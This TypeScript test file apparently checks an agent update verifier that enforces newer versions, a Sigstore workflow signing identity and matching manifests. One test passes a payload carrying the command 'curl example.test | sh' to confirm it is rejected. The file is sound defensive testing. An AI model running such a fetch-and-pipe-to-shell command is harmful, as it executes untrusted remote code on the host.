import assert from 'node:assert/strict';
import test from 'node:test';
import type { Bundle } from 'sigstore';
import { verifyAgentUpdatePayload } from './release-update.js';
import { AGENT_VERSION } from './types.js';

const repository = 'example/initpad';
const digest = `sha256:${'a'.repeat(64)}`;
const image = `ghcr.io/example/initpad-agent@${digest}`;
const [major, minor] = AGENT_VERSION.split('.').map(Number);
const newerVersion = `${major}.${minor + 1}.0`;

function payload(version = newerVersion) {
  const manifest = {
    schemaVersion: 1,
    component: 'initpad-agent',
    version,
    source: {
      repository: `https://github.com/${repository}`,
      tag: `agent-v${version}`,
      commit: 'b'.repeat(40),
    },
    image: {
      name: 'ghcr.io/example/initpad-agent',
      digest,
      immutableReference: image,
      platforms: ['linux/amd64', 'linux/arm64'],
    },
    installer: { file: 'initpad-agent-install.sh', sha256: 'c'.repeat(64) },
  };
  return {
    version,
    manifestBase64: Buffer.from(JSON.stringify(manifest)).toString('base64'),
    bundle: { mediaType: 'application/vnd.dev.sigstore.bundle.v0.3+json' } as Bundle,
  };
}

test('accepts only a newer release with the exact workflow signing identity', async () => {
  const calls: unknown[][] = [];
  const verifier = (async (...args: unknown[]) => {
    calls.push(args);
    return {};
  }) as never;

  await assert.doesNotReject(async () => {
    const update = await verifyAgentUpdatePayload(payload(), repository, verifier);
    assert.deepEqual(update, { version: newerVersion, image });
  });
  assert.equal(calls.length, 1);
  assert.deepEqual(calls[0]?.[2], {
    certificateIssuer: 'https://token.actions.githubusercontent.com',
    certificateIdentityURI: `https://github.com/example/initpad/.github/workflows/release-agent.yml@refs/tags/agent-v${newerVersion}`,
    tlogThreshold: 1,
    ctLogThreshold: 1,
    timeout: 8_000,
    tufCachePath: '/var/lib/initpad-agent/sigstore-js',
  });
});

test('rejects downgrade and same-version requests before signature verification', async () => {
  let called = false;
  const verifier = (async () => {
    called = true;
    return {};
  }) as never;

  await assert.rejects(
    verifyAgentUpdatePayload(payload(AGENT_VERSION), repository, verifier),
    /must be newer/,
  );
  await assert.rejects(
    verifyAgentUpdatePayload(payload('0.0.0'), repository, verifier),
    /must be newer/,
  );
  assert.equal(called, false);
});

test('rejects executable instructions and other unexpected payload fields', async () => {
  await assert.rejects(
    verifyAgentUpdatePayload(
      { ...payload(), command: ['sh', '-c', 'curl example.test | sh'] },
      repository,
      (async () => ({})) as never,
    ),
    /payload is invalid/,
  );
});

test('rejects a manifest from another repository or tag', async () => {
  const value = payload();
  const decoded = JSON.parse(Buffer.from(value.manifestBase64, 'base64').toString('utf8')) as {
    source: { tag: string };
  };
  decoded.source.tag = 'agent-v9.9.9';
  value.manifestBase64 = Buffer.from(JSON.stringify(decoded)).toString('base64');

  await assert.rejects(
    verifyAgentUpdatePayload(value, repository, (async () => ({})) as never),
    /manifest is invalid/,
  );
});
